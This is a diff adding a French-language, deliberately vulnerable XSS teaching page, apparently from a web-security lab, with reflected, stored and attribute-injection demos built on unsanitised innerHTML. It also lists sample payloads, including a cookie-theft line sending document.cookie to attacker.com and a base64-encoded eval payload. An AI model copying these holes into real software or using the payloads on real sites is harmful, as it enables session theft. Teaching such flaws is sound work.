@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnérabilités - XSS</title>
+    <link rel="stylesheet" href="../public/styles.css">
+    <style>
+        .danger-box {
+            background: #f8d7da;
+            border: 2px solid #f5c6cb;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            color: #721c24;
+        }
+        .code-example {
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+            font-family: monospace;
+            overflow-x: auto;
+        }
+        .test-area {
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .output-box {
+            min-height: 100px;
+            padding: 15px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            margin-top: 10px;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>⚠️ XSS - Cross-Site Scripting (VULNÉRABLE)</h1>
+            <p><a href="../public/index.html">← Retour au menu principal</a> | <a href="../securise/xss-secure.html">Voir la version sécurisée →</a></p>
+        </header>
+
+        <div class="danger-box">
+            <h2>⚠️ AVERTISSEMENT</h2>
+            <p><strong>Cette page est VOLONTAIREMENT vulnérable à des fins éducatives.</strong></p>
+            <p>Ne jamais implémenter ce code en production!</p>
+        </div>
+
+        <section>
+            <h2>Qu'est-ce que XSS?</h2>
+            <p>Cross-Site Scripting (XSS) permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs.</p>
+        </section>
+
+        <div class="test-area">
+            <h3>Test 1: Reflected XSS (DOM-based)</h3>
+            <p>Le code injecté est immédiatement affiché sans validation.</p>
+            
+            <label for="input1">Entrez votre nom:</label>
+            <input type="text" id="input1" placeholder="Essayez: <img src=x onerror=alert('XSS')>">
+            <button onclick="vulnerableDisplay1()">Afficher</button>
+            
+            <div class="output-box" id="output1"></div>
+            
+            <div class="code-example">
+                <strong>Code vulnérable:</strong><br>
+                document.getElementById('output').innerHTML = input.value;
+            </div>
+        </div>
+
+        <div class="test-area">
+            <h3>Test 2: Stored XSS Simulation</h3>
+            <p>Le commentaire est "stocké" (localStorage) et affiché à tous les visiteurs.</p>
+            
+            <label for="comment">Commentaire:</label><br>
+            <textarea id="comment" rows="3" style="width:100%; max-width:500px;" placeholder="Essayez: <script>alert('XSS stocké')</script>"></textarea><br>
+            <button onclick="storeComment()">Publier</button>
+            <button onclick="clearComments()">Effacer tous les commentaires</button>
+            
+            <div class="output-box" id="comments"></div>
+            
+            <div class="code-example">
+                <strong>Problème:</strong><br>
+                Les commentaires sont affichés avec innerHTML sans sanitisation
+            </div>
+        </div>
+
+        <div class="test-area">
+            <h3>Test 3: XSS via attribut</h3>
+            <p>Injection dans un attribut HTML.</p>
+            
+            <label for="url">URL de l'image:</label>
+            <input type="text" id="url" placeholder='Essayez: x" onerror="alert(\'XSS\')" x="'>
+            <button onclick="loadImage()">Charger l'image</button>
+            
+            <div class="output-box" id="image-container"></div>
+            
+            <div class="code-example">
+                <strong>Code vulnérable:</strong><br>
+                img.innerHTML = '&lt;img src="' + url + '"&gt;';
+            </div>
+        </div>
+
+        <section style="margin-top: 40px;">
+            <h2>Exemples d'Attaques XSS</h2>
+            <div class="code-example">
+                <strong>1. Alert basique:</strong><br>
+                &lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
+                
+                <strong>2. Vol de cookies:</strong><br>
+                &lt;script&gt;fetch('https://attacker.com?cookie='+document.cookie)&lt;/script&gt;<br><br>
+                
+                <strong>3. Via img onerror:</strong><br>
+                &lt;img src=x onerror=alert('XSS')&gt;<br><br>
+                
+                <strong>4. Via événement:</strong><br>
+                &lt;body onload=alert('XSS')&gt;<br><br>
+                
+                <strong>5. Encodage:</strong><br>
+                &lt;img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))&gt;
+            </div>
+        </section>
+
+        <section>
+            <h2>Pourquoi c'est dangereux?</h2>
+            <ul>
+                <li>🔓 Vol de cookies de session</li>
+                <li>🎭 Usurpation d'identité</li>
+                <li>📝 Modification de la page</li>
+                <li>🔑 Vol de mots de passe</li>
+                <li>📱 Phishing ciblé</li>
+                <li>🦠 Propagation de malware</li>
+            </ul>
+        </section>
+
+        <div class="danger-box">
+            <h3>🛡️ Comment se protéger?</h3>
+            <p>Voir la <a href="../securise/xss-secure.html">version sécurisée</a> pour les solutions!</p>
+        </div>
+    </div>
+
+    <script>
+        // Code VOLONTAIREMENT VULNÉRABLE - À NE PAS UTILISER EN PRODUCTION
+
+        function vulnerableDisplay1() {
+            const input = document.getElementById('input1');
+            const output = document.getElementById('output1');
+            
+            // ❌ VULNÉRABLE: Utilisation de innerHTML sans sanitisation
+            output.innerHTML = 'Bonjour, ' + input.value + '!';
+        }
+
+        function storeComment() {
+            const comment = document.getElementById('comment').value;
+            
+            if (!comment) return;
+            
+            // Stockage dans localStorage
+            let comments = JSON.parse(localStorage.getItem('vulnerable_comments') || '[]');
+            comments.push({
+                text: comment,
+                date: new Date().toLocaleString()
+            });
+            localStorage.setItem('vulnerable_comments', JSON.stringify(comments));
+            
+            displayComments();
+            document.getElementById('comment').value = '';
+        }
+
+        function displayComments() {
+            const comments = JSON.parse(localStorage.getItem('vulnerable_comments') || '[]');
+            const container = document.getElementById('comments');
+            
+            if (comments.length === 0) {
+                container.innerHTML = '<em>Aucun commentaire</em>';
+                return;
+            }
+            
+            // ❌ VULNÉRABLE: Affichage direct sans échappement
+            container.innerHTML = comments.map(c => 
+                `<div style="border-bottom:1px solid #eee; padding:10px;">
+                    <div>${c.text}</div>
+                    <small style="color:#666;">${c.date}</small>
+                </div>`
+            ).join('');
+        }
+
+        function clearComments() {
+            localStorage.removeItem('vulnerable_comments');
+            displayComments();
+        }
+
+        function loadImage() {
+            const url = document.getElementById('url').value;
+            const container = document.getElementById('image-container');
+            
+            // ❌ VULNÉRABLE: Injection dans attribut
+            container.innerHTML = '<img src="' + url + '" style="max-width:200px;">';
+        }
+
+        // Charger les commentaires au chargement
+        window.onload = displayComments;
+    </script>
+</body>
+</html>
